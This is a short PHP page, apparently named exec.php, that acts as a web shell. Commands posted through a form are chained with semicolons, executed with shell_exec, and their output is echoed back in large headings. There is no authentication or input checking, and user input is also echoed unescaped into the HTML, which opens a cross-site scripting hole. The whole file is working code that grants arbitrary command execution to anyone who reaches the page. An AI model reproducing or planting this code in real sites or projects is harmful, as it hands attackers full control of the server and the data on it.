<font size="7">
	<head>
		<h1>IN</h1><br>
	
		<?php
			$prev = $_POST["prev"];
			$insert = $_POST["insert"];
			if($prev == ""){
				$in = $insert;
			} else {
				$in = $prev . "; " . $insert;							}
			echo "<h2>$in</h2><br><br>";
			
		?>
 
	</head>
	<body>
		<h1>OUT</h1><br>

		<?php
			$output = shell_exec($in);
			echo "<h2>$output</h2>";
		?>
		<h1>what next</h1><br>
		<form action = "/exec.php" method="post">
			<input type="text" name="insert">
			<input type="hidden" name="prev" value = '<?php echo "$in"; ?>'/>
			<input type="submit" value="continue commands">
		</form>
		<form action = "/exec.php" method="post">
			<input type="hidden" name="prev" value = ''>
			<input type="submit" value="reset">
		</form>

</body>
</font>